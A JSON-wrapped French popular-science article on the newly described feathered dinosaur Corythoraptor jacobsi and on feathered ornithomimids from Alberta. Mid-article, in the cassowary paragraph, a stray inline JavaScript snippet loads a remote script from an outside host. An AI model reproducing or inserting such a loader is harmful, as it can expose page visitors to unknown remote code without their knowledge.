{"title": "Un etrange dinosaure autruche decouvert en Chine", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-07-28", "content": "Un nouveau dinosaure, cousin proche de l'oviraptor, a ete decouvert et decrit par des paleontologues chinois. Baptise  Corythoraptor jacobsi,  il devait probablement ressembler aux casoars d'Australie et de Nouvelle-Guinee. Ce qu'il faut retenir De nombreux dinosaures a plumes ont ete decouverts en Chine. L'un des derniers en date s'appelle  Corythoraptor jacobsi,  ce qui signifie << le voleur a crete de Jacobs >>. Haut d'environ 1,6 metre, ce dinosaure autruche vivait il y a entre 100 et 66 millions d'annees, pendant le Cretace superieur. Sa crete et son squelette laissent penser qu'il devait ressembler beaucoup aux casoars, des oiseaux modernes. Interview : les oiseaux sont-ils les derniers descendants des dinosaures ?                       Avec les multiples decouvertes de dinosaures a plumes en Chine, se pose la question du lien avec les oiseaux. Ces derniers pourraient-ils etre les descendants de ces creatures disparues ? Futura-Sciences a interviewe Eric Buffetaut, paleontologue, afin d'en savoir plus sur la question.                                       Depuis les annees 1990, la Chine a livre bon nombre de  fossiles  de dinosaures montrant clairement la presence de plumes chez certains de ces terribles lezards et justifiant la connexion (reconnue des le XIX e  siecle) entre les dinosaures et les oiseaux. Un article publie dans le celebre journal  Scientific Reports  le demontre a nouveau. Il fait etat de la decouverte d'un nouvel oviraptoride, un membre d'une fameuse famille eteinte de dinosaures  theropodes  a plumes dont l'un des plus connus est, bien sur, l' oviraptor . Les restes fossilises de ce  dinosaure  ont ete deterres en 2015 non loin de Canton (Guangzhou), la capitale de la province du Guangdong, dans le sud de la Chine. Presque complets, ils revelent un animal d'environ 1,6 metre de haut, taille pour la course bipede a la facon des autruches modernes. Celui-ci est mort alors qu'il etait un jeune adulte age d'au moins 8 ans, pendant le  Cretace  superieur, c'est-a-dire il y a entre 100 et 66 millions d'annees. Un casoar unicaroncule de Nouvelle-Guinee. (c) Wikipedia, CC by-sa 3.0                               Corythoraptor jacobsi,  un dinosaure a crete comme les casoars L'animal se signale par la presence d'une crete osseuse de 15 cm de haut. Compte tenu de son aspect general, il devait probablement ressembler beaucoup au casoar unicaroncule ( Casuarius unappendiculatus ), une  espece  d'oiseaux qui vit au nord de la Nouvelle-Guinee, ou encore au casoar a casque ( Casuarius casuarius ), d'Australie et d'Indonesie. Bien que craintifs, les  casoars  sont dangereux car leurs pattes sont dotees d'une griffe longue qui peut infliger des blessures comparables a celles laissees par un poignard.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le nouveau dinosaure a ete baptise  Corythoraptor jacobsi  en l'honneur du professeur Louis L. Jacobs (ce paleontologue etats-unien a ete le mentor de trois des paleontologues chinois alors qu'ils etaient doctorants dans une universite a Dallas, au Texas). Sa crete et ses similitudes avec le casoar laissent penser que cette partie du corps devait servir pour la parade, et donc pour la reproduction, et que, plus generalement, les  styles  de vie des deux types d'animaux devaient etre comparables. Pour en savoir plus Pour seduire, des dinosaures-autruches montraient leurs ailes ! Article de Quentin Mauguit publie le 26/10/2012 Evenement rare, des dinosaures-autruches a plumes ont ete trouves au Canada. L'un d'entre eux, un adulte ne pouvant pas voler, possedait meme ce qui semble etre des ailes. Elles devaient donc originellement servir durant la sequence seduction !   Ce n'est plus un secret, de nombreux dinosaures, apparentes ou non aux oiseaux actuels, possedaient des  plumes  depuis le  Trias . Cette affirmation repose sur la decouverte de plusieurs fossiles cles en Chine, dans la province du Liaoning, et en Allemagne, notamment en Baviere. Les conditions requises pour la conservation des  protoplumes  sont drastiques : l'animal doit avoir ete enfoui dans des  sediments  boueux (donc a grains fins), dans des eaux calmes, par exemple au fond de lacs ou de lagons. Du moins, c'est ce que l'on croyait jusqu'a present... Reconstruction artistique des ornithomimosaures, des  Ornithomimus edmontonicus , trouves en Alberta (Canada). La difference entre le plumage du juvenile et celui de l'adulte, qui semble posseder des ailes primitives, est clairement visible. Les couleurs sont issues de l'imagination de l'artiste. (c) Julius Csotonyi                       Trois dinosaures arborant differents types de  plumes primitives  viennent en effet d'etre decouverts dans un ancien chenal fluvial situe au Canada, dans la province d'Alberta. Les fossiles extraits du  gres  dateraient du Cretace superieur, soit d'environ 75 millions d'annees. Ils appartiendraient a la famille des ornithomimides, les  dinosaures-autruches . Aucune structure tegumentaire particuliere n'avait ete observee au sein de ce groupe auparavant. Des membres anterieurs ressemblant a des ailes ont egalement ete observes.  Les trois squelettes appartenaient a des individus d'ages differents parmi lesquels figure un juvenile qui n'aurait vecu qu'un an.  Darla Zelenitsky  de l' University of Calgary,   a etudie l'evolution du plumage durant le developpement de l'espece jusqu'a l'age adulte. Dans la revue  Science , elle confirme un fait suppose : le developpement des premieres ailes au cours de l'histoire n'est pas en lien avec le vol ! Squelette de l' Ornithomimus edmontonicus  ayant conserve des traces de plumes sur ses cubitus. Les adultes de cette espece pouvaient peser entre 100 et 150 kg. (c)  Royal Tyrrell Museum                       Les premieres ailes ? Un outil de seduction pour dinosaures Les dinosaures trouves etaient des  Ornithomimus edmontonicus , des  theropodes   herbivores  et bien sur bipedes. Le jeune et les adultes possedaient des  filaments intrategumentaires  (sortant de la peau) assimiles a des plumes primitives sur l'ensemble de leur corps. Ces structures mesuraient environ 50 mm de long et 0,5 mm de diametre. Aucune difference notable n'a ete trouvee par rapport aux protoplumes decouvertes en Chine, par exemple.  Le deuxieme  dinosaure  adulte possedait en plus de veritables plumes composees d'un axe rigide (1,5 mm de diametre) et parfois de  barbules  sur ses membres anterieurs. Ils avaient ainsi l'apparence d'ailes. Plus de 70 traces ont ete denombrees sur le cubitus (ou  ulna ). Or,  Ornithomimus edmontonicus   pouvait atteindre 3,8 m de long, son poids et sa taille devaient donc l'empecher de voler. A quoi servaient donc ces  ailes primitives  ?  Se developpant apres l'acquisition de la maturite sexuelle, il est probable qu'elles etaient utilisees durant des comportements de reproduction, par exemple lors des  parades amoureuses  ou pour la protection de sa progeniture. Leur role dans la thermoregulation ou dans le vol se serait developpe plus tard au cours de l'evolution. Il s'agirait d'un phenomene d'exaptation : la fonction finalement remplie par une adaptation ne correspondrait pas a son premier. L'apparition de structures anatomiques comparables aux  ailes actuelles  chez les ornithomimosaures, grace notamment a la presence de longues plumes et de filaments, demontre un autre fait : elles seraient apparues plus tot que prevu au cours de l'histoire evolutive des theropodes. La decouverte de plumes conservees dans du gres serait egalement lourde de consequences. On pourrait en effet trouver bien plus de  dinosaures a plumes  dans le monde qu'on ne le pensait jusqu'alors.  ", "theme": "planete"}